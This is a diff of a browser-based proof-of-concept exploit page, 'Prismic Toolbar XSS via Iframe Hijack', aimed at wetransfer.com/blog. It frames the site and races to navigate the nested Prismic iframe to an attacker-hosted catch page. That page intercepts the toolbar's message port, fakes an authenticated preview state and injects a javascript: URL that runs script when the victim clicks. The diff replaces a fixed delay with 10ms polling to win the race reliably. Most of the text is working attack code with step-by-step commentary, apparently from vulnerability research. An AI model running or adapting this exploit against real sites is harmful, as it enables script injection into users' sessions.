@@ -38,9 +38,6 @@
 <label for="catch">Catch page URL (host poc-prismic-catch.html):</label>
 <input id="catch" type="text" value="https://daemoon.me/demo/poc-prismic-catch.html">
 
-<label for="delay">Delay before navigating Prismic iframe (ms):</label>
-<input id="delay" type="number" value="3000" style="width: 100px;">
-
 <br>
 <button onclick="startAttack()">Launch</button>
 <div id="log"></div>
@@ -52,11 +49,12 @@
 1. Target page (wetransfer.com/blog) is embedded in a named &lt;iframe name="victim"&gt;
    — No X-Frame-Options or frame-ancestors headers → framing allowed
    — Attacker is ANCESTOR → can navigate any descendant frame
-2. window.open(target, "victim") targets the existing iframe, returns its WindowProxy
-3. After delay, navigate the nested Prismic iframe:
-   x.frames[0].location.href = catchURL
-   — prismic.js uses {once: true} load handler → fires for catch page instead
-   — prismic.io needs DNS+TLS+HTTP (~200-500ms), attacker catches the race
+2. window.open(target, "victim") reloads the iframe, returns its WindowProxy
+3. Poll x.frames.length every 10ms — detect Prismic sub-iframe the instant it appears
+4. IMMEDIATELY navigate x.frames[0] to catch page — MUST beat prismic.io load!
+   — prismic.js uses {once: true} load handler
+   — prismic.io needs DNS+TLS+HTTP (~200-500ms), our navigation takes &lt;10ms
+   — Catch page loads FIRST → load event fires for US → setup_port goes to us
 4. Catch page loads → receives setup_port from prismic.js (wildcard '*' origin)
 5. Catch page responds 'ready', then returns auth:true for preview_state
 6. Target page loads toolbar.js → Prismic Toolbar with prediction handler
@@ -97,71 +95,79 @@ function log(msg, cls) {
 function startAttack() {
   var TARGET = document.getElementById('target').value;
   var CATCH_URL = document.getElementById('catch').value;
-  var DELAY = Number(document.getElementById('delay').value);
-  if (isNaN(DELAY) || DELAY < 0) DELAY = 3000;
 
   log('=== Prismic Toolbar XSS via Iframe Hijack ===', 'warn');
   log('Target: ' + TARGET, 'info');
   log('Catch page: ' + CATCH_URL, 'info');
-  log('Delay: ' + DELAY + 'ms', 'info');
 
-  // Step 1: window.open targets the existing named iframe, returns its WindowProxy
-  // The iframe is already loaded with the target page (pre-embedded in HTML)
+  // Step 1: window.open targets the existing named iframe, reloads it fresh
+  // This triggers a fresh page load → prismic.js runs again → creates NEW Prismic sub-iframe
   var x = window.open(TARGET, "victim");
   if (!x) {
     log('Failed to get window reference.', 'error');
     return;
   }
-  log('Got reference to victim iframe window.', 'success');
+  log('Reloading victim iframe...', 'success');
 
-  // Step 2: After delay, navigate the nested Prismic iframe to catch page
-  // x.frames[0] = the first child iframe inside wetransfer.com/blog (Prismic iframe)
-  // As ancestor, we can navigate descendant frames cross-origin
-  log('Waiting ' + DELAY + 'ms for Prismic iframe to appear...', 'info');
+  // Step 2: IMMEDIATELY poll for the Prismic sub-iframe to appear
+  // Race condition: we must navigate frames[0] BEFORE prismic.io content loads
+  //
+  // Timeline:
+  //   t=0     : iframe starts loading wetransfer.com/blog
+  //   t=~1-2s : page loaded, prismic.js creates sub-iframe (src=prismic.io)
+  //   t=~1-2s : *** WE DETECT frames.length > 0, navigate immediately ***
+  //   t=~2-3s : prismic.io would have loaded (but we navigated first!)
+  //
+  // prismic.js uses {once: true} load handler on the sub-iframe.
+  // If we navigate before prismic.io loads, OUR catch page triggers the load event.
+  // setup_port goes to our catch page instead of prismic.io!
+  //
+  // Window to win: ~200-500ms (prismic.io DNS+TLS+HTTP time)
+  // Our detection: ~10ms polling interval
 
-  setTimeout(function() {
+  var navigated = false;
+  var startTime = Date.now();
+
+  var poller = setInterval(function() {
+    if (navigated) { clearInterval(poller); return; }
+
     try {
-      log('Attempting to navigate x.frames[0] to catch page...', 'info');
-      x.frames[0].location.href = CATCH_URL;
-      log('Navigated Prismic iframe to catch page!', 'success');
-      log('', 'info');
-      log('Wait ~5 seconds for the full chain:', 'warn');
-      log('  1. Catch page loads → receives setup_port from prismic.js', 'info');
-      log('  2. Responds auth:true → toolbar.js loads', 'info');
-      log('  3. prediction_docs → javascript: editorUrl injected', 'info');
-      log('  4. Prismic toolbar icon appears at bottom-left of page in iframe', 'info');
-      log('  5. Click icon → panel opens → click document link → XSS fires', 'info');
-    } catch(e) {
-      log('Failed: ' + e.message, 'error');
-      log('', 'info');
-      log('Trying alternative: polling for frames...', 'warn');
+      var len = x.frames.length;
+      if (len > 0 && !navigated) {
+        navigated = true;
+        clearInterval(poller);
+        var elapsed = Date.now() - startTime;
+        log('Detected ' + len + ' sub-frame(s) after ' + elapsed + 'ms!', 'success');
 
-      // Fallback: poll for child frames to appear
-      var attempts = 0;
-      var poller = setInterval(function() {
-        attempts++;
+        // Navigate IMMEDIATELY — must beat prismic.io load
         try {
-          var len = x.frames.length;
-          if (len > 0) {
-            clearInterval(poller);
-            log('Found ' + len + ' frame(s) after ' + (attempts * 100) + 'ms', 'success');
-            try {
-              x.frames[0].location.href = CATCH_URL;
-              log('Navigated frames[0] to catch page!', 'success');
-            } catch(e2) {
-              log('Navigation failed: ' + e2.message, 'error');
-            }
-          }
-        } catch(e3) {
-          // cross-origin access may throw, keep trying
+          x.frames[0].location.href = CATCH_URL;
+          log('Navigated Prismic iframe to catch page! (race won in ' + elapsed + 'ms)', 'success');
+          log('', 'info');
+          log('Now wait ~5s for the full chain:', 'warn');
+          log('  1. Catch page loads → prismic.js {once:true} handler fires', 'info');
+          log('  2. setup_port sent to catch page (wildcard * origin)', 'info');
+          log('  3. Catch responds ready, then auth:true → toolbar.js loads', 'info');
+          log('  4. prediction_docs → javascript: editorUrl injected', 'info');
+          log('  5. Prismic toolbar icon appears at bottom-left of page', 'info');
+          log('  6. Click icon → panel → click document link → XSS!', 'info');
+        } catch(e) {
+          log('Navigation failed: ' + e.message, 'error');
         }
-        if (attempts > 100) {
-          clearInterval(poller);
-          log('Gave up after 10s polling.', 'error');
-        }
-      }, 100);
+      }
+    } catch(e) {
+      // cross-origin — keep polling
     }
-  }, DELAY);
+  }, 10); // Poll every 10ms for fastest detection
+
+  // Timeout after 30 seconds
+  setTimeout(function() {
+    if (!navigated) {
+      clearInterval(poller);
+      log('Timeout (30s) — no sub-frames detected.', 'error');
+      log('The Prismic iframe may not be created when page is in a cross-origin frame.', 'warn');
+    }
+  }, 30000);
 }
 </script>
 </body>
